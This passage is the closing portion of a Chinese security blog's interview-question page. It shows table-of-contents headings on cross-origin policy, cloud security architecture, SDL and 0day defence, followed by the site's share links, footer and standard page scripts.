href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9F%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E7%9A%84%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%EF%BC%9F"><span class="toc-number">87.9.</span> <span class="toc-text">同源策略？如何实现安全的跨域请求？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E6%96%B9%E5%90%91"><span class="toc-number">88.</span> <span class="toc-text">安全架构方向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F-IDC%E3%80%81%E4%BA%91%E4%B8%8A%E3%80%81%E6%B7%B7%E5%90%88%E4%BA%91%E6%9E%B6%E6%9E%84%E7%9A%84%E5%AE%89%E5%85%A8%E5%B7%AE%E5%BC%82%E5%92%8C%E6%8C%91%E6%88%98"><span class="toc-number">88.1.</span> <span class="toc-text">传统 IDC、云上、混合云架构的安全差异和挑战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%8E%9F%E7%94%9F%E6%8A%80%E6%9C%AF%E4%B8%8B%E7%9A%84%E5%AE%89%E5%85%A8%E5%8F%98%E5%8C%96"><span class="toc-number">88.2.</span> <span class="toc-text">云原生技术下的安全变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AF%E4%BA%91%E4%B8%9A%E5%8A%A1%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%EF%BC%9F"><span class="toc-number">88.3.</span> <span class="toc-text">纯云业务如何设计安全架构？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SDL-%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F"><span class="toc-number">88.4.</span> <span class="toc-text">SDL 中的关键点以及如何解决？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%9C%A8%E7%94%B2%E6%96%B9%E5%92%8C%E4%B9%99%E6%96%B9%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">88.5.</span> <span class="toc-text">漏洞发现在甲方和乙方的区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-0day-%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">88.6.</span> <span class="toc-text">如何防止 0day 攻击？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E4%BC%81%E4%B8%9A%E4%B8%8D%E5%90%8C%E9%98%B6%E6%AE%B5%E3%80%81%E4%B8%8D%E5%90%8C%E4%BD%93%E9%87%8F%E7%9A%84%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E6%96%B9%E6%B3%95%E3%80%81%E5%8C%BA%E5%88%AB%E5%8F%8A%E4%BE%A7%E9%87%8D"><span class="toc-number">88.7.</span> <span class="toc-text">不同企业不同阶段、不同体量的安全建设方法、区别及侧重</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/03/work/workpre1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/03/work/workpre1/&text=【工作】面试题整理 应用安全等"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/03/work/workpre1/&is_video=false&description=【工作】面试题整理 应用安全等"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 应用安全等&body=Check out this article: https://godreams.cn/2024/03/03/work/workpre1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/03/work/workpre1/&title=【工作】面试题整理 应用安全等"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/03/work/workpre1/&name=【工作】面试题整理 应用安全等&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/03/work/workpre1/&t=【工作】面试题整理 应用安全等"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
